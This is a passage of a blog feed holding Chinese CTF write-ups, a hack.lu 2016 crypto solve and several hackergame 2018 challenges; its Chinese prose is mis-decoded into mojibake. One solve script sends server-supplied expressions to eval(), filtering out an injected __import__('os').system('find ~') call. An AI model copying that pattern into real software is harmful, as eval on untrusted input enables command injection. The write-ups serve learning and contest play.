string.printable:</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="built_in">dict</span>.append(hashlib.sha256(x+y).digest())</span><br><span class="line"></span><br><span class="line">cipher=flag_enc</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        raw=AESCipher(key).decrypt(cipher)</span><br><span class="line">        <span class="keyword">if</span> checkPadding(raw):</span><br><span class="line">            cipher=AESCipher._unpad(raw)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="built_in">len</span>(cipher)<span class="number">-1</span>:</span><br><span class="line">    <span class="keyword">if</span> cipher[i]==<span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        flag+=<span class="built_in">chr</span>(<span class="built_in">int</span>(cipher[i:i+<span class="number">3</span>]))</span><br><span class="line">        i=i+<span class="number">3</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag+=<span class="built_in">chr</span>(<span class="built_in">int</span>(cipher[i:i+<span class="number">2</span>]))</span><br><span class="line">        i=i+<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span> flag</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯è§£å¯†å‡ºæ¥çš„æ˜æ–‡æ˜¯ä¸€ä¸²æ•°å­—:<br><code>12010997110123651081141019710012145761019711411010110045676667458097100100105110103125</code><br>ç”¨æ­£å¸¸ <code>hexè§£ç </code>æ˜¯ä¹±ç ï¼Œè§‚å¯Ÿå‘ç°é¦–éƒ¨ 120,109,97 éƒ½åƒæ˜¯ ascii å€¼ï¼Œæ•°å­—å…¶å®æ˜¯ flag å­—ç¬¦ä¸²æ¯ä¸ªå­—ç¬¦åè¿›åˆ¶ ascii å€¼è¿èµ·æ¥çš„ã€‚</p><blockquote><p>è¿è¡Œç»“æœï¼š xman{Already-Learned-CBC-Padding}</p></blockquote><p>å‚è€ƒï¼š</p><ol><li><p><a href="https://github.com/ctfs/write-ups-2016/tree/master/hack.lu-ctf-2016/crypto/cryptolocker-200">hack.lu 2016 åŸé¢˜ç›®</a></p></li><li><p><a href="https://p-te.fr/2016/10/20/hack-lu-cryptolocker/">https://p-te.fr/2016/10/20/hack-lu-cryptolocker/</a></p></li><li><p><a href="https://gophers-in-the-shell.herokuapp.com/hack-lu-2016-cryptolock-crypto-200-pts/">https://gophers-in-the-shell.herokuapp.com/hack-lu-2016-cryptolock-crypto-200-pts/</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackergame 2018</title>
      <link href="/2018/10/16/hackergame2018/"/>
      <url>/2018/10/16/hackergame2018/</url>
      
        <content type="html"><![CDATA[<p>åšäº†åšä¸­ç§‘å¤§çš„hackergameï¼Œæ„Ÿè§‰ä¸æ˜¯ä¼ ç»Ÿçš„CTFï¼Œåé‡äºè¶£å‘³æ€§ã€‚åšäº†ä¸€å¤©å¤šå°±æ²¡åšäº†â€¦</p><h3 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h3><p>æäº¤ hackergame2018 å³å¯ï¼Œä½†æ˜¯è¾“å…¥æ¡†è¿›è¡Œäº†é™åˆ¶ï¼Œæ”¹ä¸€ä¸‹è¾“å…¥æ¡†é™åˆ¶å¤§å°å°±å¯ä»¥äº†(æˆ–è€…æŠ“åŒ…å‘)ã€‚</p><blockquote><p>flag{Hackergame2018_Have_Fun!}</p></blockquote><a id="more"></a><h3 id="çŒ«å’ªé—®ç­”"><a href="#çŒ«å’ªé—®ç­”" class="headerlink" title="çŒ«å’ªé—®ç­”"></a>çŒ«å’ªé—®ç­”</h3><p>emmmmm ä¸­ç§‘å¤§çš„ç‰¹è‰²é¢˜ï¼Œé—®çš„å°±æ˜¯ä¸­ç§‘å¤§çš„ä¸€äº›ä¸œè¥¿ï¼Œç›´æ¥ google å°±å¥½äº†ï¼š<br><img src="https://upload-images.jianshu.io/upload_images/9223743-1f363ad2b98247be.png" alt="image.png"></p><blockquote><p>flag{G00G1E-is-always-YOUR-FRIEND}</p></blockquote><h3 id="æ¸¸å›­ä¼šçš„é›†ç« å¡ç‰‡"><a href="#æ¸¸å›­ä¼šçš„é›†ç« å¡ç‰‡" class="headerlink" title="æ¸¸å›­ä¼šçš„é›†ç« å¡ç‰‡"></a>æ¸¸å›­ä¼šçš„é›†ç« å¡ç‰‡</h3><p>é™„ä»¶ç»™äº†ä¸€å †å›¾ç‰‡ï¼Œè¿™ä¸ªé¢˜å°±æ˜¯æ‹¼å›¾ï¼ŒæŠŠå›¾æ‹¼èµ·æ¥å°±å¥½äº†ï¼š<br><img src="https://upload-images.jianshu.io/upload_images/9223743-550250aab6fa5c51.png" alt="flag.png"></p><blockquote><p>flag{H4PPY_1M4GE_PR0CE551NG}  (æ³¨æ„æ•°å­—1å’Œå­—æ¯lçš„åŒºåˆ«)</p></blockquote><h3 id="Word-æ–‡æ¡£"><a href="#Word-æ–‡æ¡£" class="headerlink" title="Word æ–‡æ¡£"></a>Word æ–‡æ¡£</h3><p>é¢˜ç›®ç»™äº†ä¸€ä¸ª OfficeOpenXML.docxï¼Œæ‰“ä¸å¼€ã€‚è€ƒè™‘ç”¨ binwalk -e å‘½ä»¤ï¼Œå¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ã€‚</p><p>å‹ç¼©åŒ…é‡Œå‘ç°flag.txtã€‚</p><blockquote><p>flag{xlsx,pptx,docx_are_just_zip_files}</p></blockquote><h3 id="çŒ«å’ªé“¶è¡Œ"><a href="#çŒ«å’ªé“¶è¡Œ" class="headerlink" title="çŒ«å’ªé“¶è¡Œ"></a>çŒ«å’ªé“¶è¡Œ</h3><p>é¢˜ç›®çš„æ„æ€æ˜¯åŸæœ¬æœ‰ 10CTBï¼Œé€šè¿‡å­˜æ¬¾å¹¶å–å‡ºæ¥èµšé’±ï¼Œèµšå¤Ÿ 20CTBå»ä¹° flagã€‚ä½†æ˜¯é—®é¢˜åœ¨äºæœ‰æ•ˆæœŸå°± 10 åˆ†é’Ÿï¼Œèµšä¸å¤Ÿ 20CTBï¼Œå–å‡ºçš„æ—¶é—´è¿œè¿œè¶…å‡º 10 åˆ†é’Ÿã€‚</p><p>å°è¯•æŠŠæ—¶é—´è¾“çš„å¤§ä¸€äº›ï¼Œå‘ç°ç›´æ¥æº¢å‡ºäº†â€¦<br><img src="https://upload-images.jianshu.io/upload_images/9223743-83b548f2e12df780.png" alt="image.png"><br>ç›´æ¥å–å‡ºï¼Œå†æ¢æˆCTBï¼Œå»ä¹°flagï¼š<br><img src="https://upload-images.jianshu.io/upload_images/9223743-6b317ea6e8af70c5.png" alt="image.png"></p><blockquote><p>flag{Evil_Integer._Evil_Overflow.}</p></blockquote><h3 id="é»‘æ›œçŸ³æµè§ˆå™¨"><a href="#é»‘æ›œçŸ³æµè§ˆå™¨" class="headerlink" title="é»‘æ›œçŸ³æµè§ˆå™¨"></a>é»‘æ›œçŸ³æµè§ˆå™¨</h3><p>é¢˜ç›®è¯´è¯·ä½¿ç”¨é»‘æ›œçŸ³æµè§ˆå™¨è®¿é—®ï¼Œè°·æ­Œä¸€æ³¢é»‘æ›œçŸ³æµè§ˆå™¨ï¼Œå‘ç°äº†å®˜ç½‘ï¼š <a href="https://heicore.com/index.php">https://heicore.com/index.php</a></p><p>æƒ³è¦ä¸‹è½½æµè§ˆå™¨è¦ç™»å½•ï¼Œç™»å½•éœ€è¦æ³¨å†Œï¼Œæ³¨å†Œéœ€è¦é»‘æ›œçŸ³æµè§ˆå™¨è®¿é—®â€¦ æ€€ç–‘è¿™ä¸ªå®˜ç½‘æ˜¯å‡ºé¢˜äººå†™çš„â€¦</p><p>çœ‹é¡µé¢åº”è¯¥æ˜¯è¿™ä¸ªæµè§ˆå™¨å°±æ˜¯ä¸ªæ¢—ï¼Œå‡ºé¢˜äººæ ¹æ®å®˜ç½‘å‡ºçš„ï¼Œæ„Ÿè§‰å¥—è·¯å°±æ˜¯æŠ“åŒ…æŠŠ user-agent æ”¹æˆè¿™ä¸ªæ‰€è°“çš„é»‘æ›œçŸ³æµè§ˆå™¨çš„æ ¼å¼ï¼Œä½†æ˜¯é—®é¢˜æ˜¯ user-agent æ ¼å¼ä¸æ¸…æ¥šã€‚</p><p>åº”è¯¥æ˜¯è¿™ä¸ªå®˜ç½‘æœ‰ç«¯å€ªï¼Œè¿™ä¸ªç½‘ç«™æˆ‘å³é”®çœ‹ä¸äº†æºç â€¦ ctrl+u ä¹Ÿä¸è¡Œï¼ŒF12å°±å´©æºƒï¼Œæºç è‚¯å®šæœ‰ä¸œè¥¿ã€‚æ²¡åŠæ³•å°±ç›´æ¥æµè§ˆå™¨æ‰‹è¾“ view-source:<a href="https://heicore.com">https://heicore.com</a> æˆäº†ã€‚æ‰¾åˆ°äº†è¿™ä¸ªï¼š<br><img src="https://upload-images.jianshu.io/upload_images/9223743-fcc6949a899ef97f.png" alt="image.png"><br>åº”è¯¥å°±æ˜¯æƒ³è¦çš„ï¼Œè®¿é—®é¢˜ç›®åœ°å€ï¼ŒæŠ“åŒ…æ”¹ user-agentï¼š<br><img src="https://upload-images.jianshu.io/upload_images/9223743-9b825c187cfd4ade.png" alt="image.png"></p><blockquote><p>flag{H3ic0re_49.1.2623.213_sai_kou}</p></blockquote><h3 id="å›åˆ°è¿‡å»"><a href="#å›åˆ°è¿‡å»" class="headerlink" title="å›åˆ°è¿‡å»"></a>å›åˆ°è¿‡å»</h3><p>é¢˜ç›®ç»™äº†ä¸ªé™„ä»¶ï¼Œæ‰“å¼€æ˜¯å†™ flag æ–‡ä»¶çš„ ed å‘½ä»¤ï¼Œå»ç…§ç€å‘½ä»¤è¾“ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">q</span><br><span class="line">ed</span><br><span class="line">a</span><br><span class="line">flag&#123;</span><br><span class="line">.</span><br><span class="line">a</span><br><span class="line">44a2b8</span><br><span class="line">a3d9b2c</span><br><span class="line">c44039</span><br><span class="line">f93345</span><br><span class="line">&#125;</span><br><span class="line">.</span><br><span class="line">2m3</span><br><span class="line">2m5</span><br><span class="line">2m1</span><br><span class="line">2</span><br><span class="line">s&#x2F;4&#x2F;t</span><br><span class="line">q</span><br><span class="line">q</span><br></pre></td></tr></table></figure><p>å‘½ä»¤ä¸åŒ…æ‹¬ä¿å­˜æ–‡ä»¶çš„å‘½ä»¤ï¼Œæ‰€ä»¥è¦åœ¨æœ€å q ä¹‹å‰åŠ ä¸€ä¸ª â€œw flag.txtâ€ ä¿å­˜æ–‡ä»¶ï¼Œå‘ç°æˆåŠŸå†™å…¥ flag.txtï¼š<br><img src="https://upload-images.jianshu.io/upload_images/9223743-832c1a6fa31ce544.png" alt="image.png"></p><blockquote><p>flag{t4a2b8c44039f93345a3d9b2}</p></blockquote><h3 id="æˆ‘æ˜¯è°"><a href="#æˆ‘æ˜¯è°" class="headerlink" title="æˆ‘æ˜¯è°"></a>æˆ‘æ˜¯è°</h3><h4 id="å“²å­¦æ€è€ƒ"><a href="#å“²å­¦æ€è€ƒ" class="headerlink" title="å“²å­¦æ€è€ƒ"></a>å“²å­¦æ€è€ƒ</h4><p>æç¤ºè¾“å…¥æˆ‘æ˜¯è°ï¼Œåˆ°åº•æ˜¯ä»€ä¹ˆä¸œè¥¿å‘¢ï¼Ÿçœ‹æºç ç­‰ç­‰æ‰¾äº†åŠå¤©ï¼Œæœ€å F12 çœ‹åˆ°äº†æœåŠ¡å™¨çŠ¶æ€ç ï¼š<br><img src="https://upload-images.jianshu.io/upload_images/9223743-3fa646eb54744f17.png" alt="image.png"></p><blockquote><p>Iâ€™M A TEAPOT</p></blockquote><p>è¾“å…¥ teapot å¾—åˆ° flag:</p><blockquote><p>flag{i_canN0t_BReW_c0ffEE!}</p></blockquote><h4 id="Can-I-help-me"><a href="#Can-I-help-me" class="headerlink" title="Can I help me?"></a>Can I help me?</h4><p>æ‰“å¼€ç¬¬ä¸€é—®ç»™çš„é“¾æ¥ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-f1784f22c0371f3a.png" alt="image.png"><br>ç”¨ä¸åŒæ–¹æ³•è®¿é—®ï¼ŒæŠ“åŒ…æ”¹æˆPOSTè®¿é—®ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-1c7c243d92c50851.png" alt="image.png"><br>æ ¹æ®æç¤ºå»çœ‹ RFC-7168ï¼Œå‘ç°äº† BREW è®¿é—®ï¼Œæ”¹æˆ BREWï¼Œæç¤ºç¼ºå°‘å‚æ•°ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-c1c0fab5ff63297e.png" alt="image.png"><br>å» RFC-7168 æ‰¾ä¸€ä¸‹å¤´éƒ¨å‚æ•°ï¼Œå‘ç°äº†è¿™ä¸ªï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-70fdbc08ea8ab9a1.png" alt="image.png"><br>åŠ ä¸€ä¸ª Content-Type: message/teapot,ç»™äº†ä¸€ä¸ªé“¾æ¥ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-c941462869272e83.png" alt="image.png"><br>å»è®¿é—®ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-54fe49def5312266.png" alt="image.png"></p><blockquote><p>flag{delivering_tea_to_DaLa0}</p></blockquote><h3 id="çŒ«å’ªé¥æ§å™¨"><a href="#çŒ«å’ªé¥æ§å™¨" class="headerlink" title="çŒ«å’ªé¥æ§å™¨"></a>çŒ«å’ªé¥æ§å™¨</h3><p>é¢˜ç›®ç»™äº†æ§åˆ¶çŒ«è¡ŒåŠ¨çš„æŒ‡ä»¤ï¼ŒU,D,L,R åˆ†åˆ«å¯¹åº”ä¸Šï¼Œä¸‹ï¼Œå·¦ï¼Œå³ã€‚åº”è¯¥è¦æŠŠå›¾ç”»å‡ºæ¥ï¼Œå€ŸåŠ© python çš„ turtle åº“(æ®è¯´æ•™å°å­©å­å­¦ç¼–ç¨‹çš„â€¦)</p><p>è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> turtle</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">t = turtle.Pen()</span><br><span class="line">position=[<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">data=<span class="built_in">open</span>(<span class="string">&quot;seq.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> i==<span class="string">&quot;D&quot;</span>:</span><br><span class="line">        position[<span class="number">1</span>]-=<span class="number">0.7</span></span><br><span class="line">    <span class="keyword">elif</span> i==<span class="string">&quot;U&quot;</span>:</span><br><span class="line">        position[<span class="number">1</span>]+=<span class="number">0.7</span></span><br><span class="line">    <span class="keyword">elif</span> i==<span class="string">&quot;L&quot;</span>:</span><br><span class="line">        position[<span class="number">0</span>]-=<span class="number">0.7</span></span><br><span class="line">    <span class="keyword">elif</span> i==<span class="string">&quot;R&quot;</span>:</span><br><span class="line">        position[<span class="number">0</span>]+=<span class="number">0.7</span></span><br><span class="line">    t.goto(position[<span class="number">0</span>],position[<span class="number">1</span>])</span><br><span class="line">time.sleep(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>ç»“æœï¼š<br><img src="https://upload-images.jianshu.io/upload_images/9223743-5b1a5955abdb3ca8.jpg" alt="Q"></p><blockquote><p>flag{MeowMeow}</p></blockquote><h3 id="çŒ«å’ªå…‹æ˜Ÿ"><a href="#çŒ«å’ªå…‹æ˜Ÿ" class="headerlink" title="çŒ«å’ªå…‹æ˜Ÿ"></a>çŒ«å’ªå…‹æ˜Ÿ</h3><p>nc è¿‡å»è®©è®¡ç®—è¡¨è¾¾å¼çš„å€¼ï¼Œå†™ä¸ªäº¤äº’è„šæœ¬å‘ç°äº†é—®é¢˜â€¦ç®—åˆ°åé¢æ— ç¼˜æ— æ•…é€€å‡ºæˆ–è€…ç¨‹åºç»ˆæ­¢ã€‚</p><p>è°ƒè¯•ä¸€ä¸‹å‘ç°åé¢è®¡ç®—çš„è¡¨è¾¾å¼ä¸­å«æœ‰ print,sleep,exit ä¹‹ç±»çš„å‘½ä»¤ï¼Œè€Œæˆ‘ç”¨ eval() ç›´æ¥æ‰§è¡Œæ˜¾ç„¶ä¸è¡Œï¼Œè¦å¯¹æ¥å—çš„è¡¨è¾¾å¼è¿›è¡Œä¸€ç‚¹æ›¿æ¢ï¼ŒæŠŠè¿™äº›å‘½ä»¤æ›¿æ¢æˆ 0 ï¼Œä¸‹é¢æ˜¯æœ€åçš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Eval</span>(<span class="params">shizi</span>):</span></span><br><span class="line">    <span class="keyword">if</span> shizi.find(<span class="string">&quot;print&quot;</span>)!=<span class="number">-1</span>:</span><br><span class="line">        a = re.findall(<span class="string">&quot;print(..*?\).*?)&quot;</span>, shizi)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">            shizi = shizi.replace(i, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;print&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> shizi.find(<span class="string">&quot;system&quot;</span>)!=<span class="number">-1</span>:</span><br><span class="line">        shizi = shizi.replace(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;find ~&#x27;)&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> shizi.find(<span class="string">&quot;sleep&quot;</span>)!=<span class="number">1</span>:</span><br><span class="line">        shizi=shizi.replace(<span class="string">&quot;__import__(&#x27;time&#x27;).sleep(100)&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> shizi.find(<span class="string">&quot;exit()&quot;</span>)!=<span class="number">1</span>:</span><br><span class="line">        shizi=shizi.replace(<span class="string">&quot;exit()&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(shizi)</span><br><span class="line">time = <span class="number">1</span></span><br><span class="line">sc = socket.socket()</span><br><span class="line">host = <span class="string">&quot;202.38.95.46&quot;</span></span><br><span class="line">port = <span class="number">12009</span></span><br><span class="line">addr = (host, port)</span><br><span class="line">sc.connect(addr)</span><br><span class="line">print(sc.recv(<span class="number">1024</span>).decode())</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">&quot;-----------round &#123;&#125;--------------&quot;</span>.<span class="built_in">format</span>(time))</span><br><span class="line">    data = sc.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    print(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">        exit()</span><br><span class="line">    shizi = data.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    result = <span class="built_in">str</span>(Eval(shizi))</span><br><span class="line">    print(<span class="string">&quot;result:&quot;</span>, result)</span><br><span class="line">    sc.send((result + <span class="string">&quot;\n&quot;</span>).encode())</span><br><span class="line">    time +=<span class="number">1</span></span><br></pre></td></tr></table></figure><blockquote><p>flag{â€˜Life_1s_sh0rt_use_PYTH0Nâ€™*1000}</p></blockquote><h3 id="ä»–çš„è¯—"><a href="#ä»–çš„è¯—" class="headerlink" title="ä»–çš„è¯—"></a>ä»–çš„è¯—</h3><p>é¢˜ç›®ç»™äº†ä¸€ä¸ª poem.txt å’Œ helper.py ä¸¤ä¸ªæ–‡ä»¶ã€‚</p><p><strong>poem.txt</strong>é‡Œé¢æ˜¯å¯†æ–‡ï¼Œ<strong>helper.py</strong>æ˜¯ä¸€æ®µè§£å¯†ç¨‹åºã€‚</p><p>è¿è¡Œ helper.py å¾—åˆ°è¿™æ ·ä¸€é¦–è¯—ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">---------</span><br><span class="line">There is something in this world</span><br><span class="line">that no one has ever seen before.</span><br><span class="line">It is gentle and sweet.</span><br><span class="line">Maybe if it could be seen,</span><br><span class="line">everyone would fight over it.</span><br><span class="line">That is why the world hid it,</span><br><span class="line">so that no one could get their hands</span><br><span class="line">on it so easily.</span><br><span class="line">However, someday, someone will find it.</span><br><span class="line">The person who deserves it the most</span><br><span class="line">will definitely find it.</span><br><span class="line">---------</span><br><span class="line">Do you like this school?</span><br><span class="line">I really, really love it.</span><br><span class="line">But nothing can stay unchanged.</span><br><span class="line">Fun things... Happy things...</span><br><span class="line">They can&#39;t all possibly stay unchanged.</span><br><span class="line">Even so,</span><br><span class="line">can you go on loving this place?</span><br><span class="line">---------</span><br><span class="line">Sometimes I wonder,</span><br><span class="line">what if this town was alive?</span><br><span class="line">What if it had thoughts and feelings</span><br><span class="line">like one of us?</span><br><span class="line">If it did,</span><br><span class="line">I think it would want to make the people</span><br><span class="line">who live here happy.</span><br><span class="line">---------</span><br><span class="line">Expectations are what you have</span><br><span class="line">when you have given up.</span><br><span class="line">Expectations are born from</span><br><span class="line">a despairingly large difference in skill.</span><br><span class="line">---------</span><br><span class="line">A joke only lasts for a moment,</span><br><span class="line">if it leaves a misunderstanding,</span><br><span class="line">it becomes a lie.</span><br><span class="line">---------</span><br><span class="line">If someone didn&#39;t have any pride,</span><br><span class="line">wouldn&#39;t they also be lacking</span><br><span class="line">in self-confidence?</span><br><span class="line">If someone was free of greed,</span><br><span class="line">wouldn&#39;t they have trouble</span><br><span class="line">supporting their family?</span><br><span class="line">And if people didn&#39;t envy one another,</span><br><span class="line">wouldn&#39;t they stop inventing new things?</span><br><span class="line">---------</span><br><span class="line">If I don&#39;t have to do it, I won&#39;t.</span><br><span class="line">If I have to do it, I&#39;ll make it.</span><br><span class="line">---------</span><br><span class="line">&#x2F;* Here is the end of my poem.</span><br><span class="line">Have you ever found my FLAG? :) *&#x2F;</span><br></pre></td></tr></table></figure><p>çœ‹äº†åŠå¤©è¿™åªæ˜¯ä¸€é¦–è¯—ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šçš„åœ°æ–¹ã€‚é‚£ä¹ˆ flag åˆ°åº•åœ¨å“ªå‘¢ï¼Ÿ</p><p>æŠŠç›®å…‰æ”¾åˆ°è§£å¯†çš„ py è„šæœ¬ä¸Šï¼Œå…¶ä¸­ä¸€å¥ï¼š</p><blockquote><p>decode_data = decode(data.encode(â€œasciiâ€), â€œuuâ€)</p></blockquote><p>è¿™ä¸ª uu æ˜¯ä¸æ˜¯æœ‰ç‰¹å®šå«ä¹‰ï¼Ÿæˆ‘æ”¹æˆåˆ«çš„å­—æ¯å‘ç°æŠ¥é”™ï¼ŒæŸ¥äº†æŸ¥æ‰çŸ¥é“æ˜¯ uuencode ç¼–ç ã€‚</p><p>æ—¢ç„¶å¦‚æ­¤ï¼ŒæŠŠå¯†æ–‡æ”¾åˆ°<a href="http://web.chacuo.net/charsetuuencode">uuencode åœ¨çº¿è§£å¯†ç½‘ç«™</a>è¿›è¡Œè§£å¯†ï¼Œå‘ç°äº†ä¸ä¸€æ ·çš„åœ°æ–¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">---------There is something in this worldfthat no one has ever seen before.It is gentle and sweet.lMaybe if it could be seen,aeveryone would fight over it.gThat is why the world hid it,&#123;so that no one could get their handson it so easily.STHowever, someday, someone will find it.The person who deserves it the mostewill definitely find it.---------Do you like this school?I really, really love it.gABut nothing can stay unchanged.n0Fun things... Happy things...gThey can&#39;t all possibly stay unchanged.Even so,rcan you go on loving this place?A---------Sometimes I wonder,Phwhat if this town was alive?y_What if it had thoughts and feelingslike one of us?If it did,w1I think it would want to make the peopletHwho live here happy._---------Expectations are what you havewhen you have given up.uExpectations are born fromUa despairingly large difference in skill.e---------A joke only lasts for a moment,Ncif it leaves a misunderstanding,0it becomes a lie.D---------If someone didn&#39;t have any pride,wouldn&#39;t they also be lackingEin self-confidence?_IIf someone was free of greed,5wouldn&#39;t they have trouble_supporting their family?And if people didn&#39;t envy one another,5wouldn&#39;t they stop inventing new things?0_---------If I don&#39;t have to do it, I won&#39;t.fuIf I have to do it, I&#39;ll make it.---------&#x2F;* Here is the end of my poem.</span><br></pre></td></tr></table></figure><p>å’±ä»¬çœ‹åˆ°äº†èŠ±æ‹¬å·<strong>{</strong>ï¼Œå’Œè„šæœ¬è·‘å‡ºæ¥è§£å¯†ç»“æœä¸ä¸€æ ·ï¼ŒçŒœæƒ³æ¯”è„šæœ¬è§£å¯†ç»“æœå¤šçš„éƒ¨åˆ†å°±æ˜¯ flag,å†™ä¸ªè„šæœ¬æ¯”è¾ƒä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span 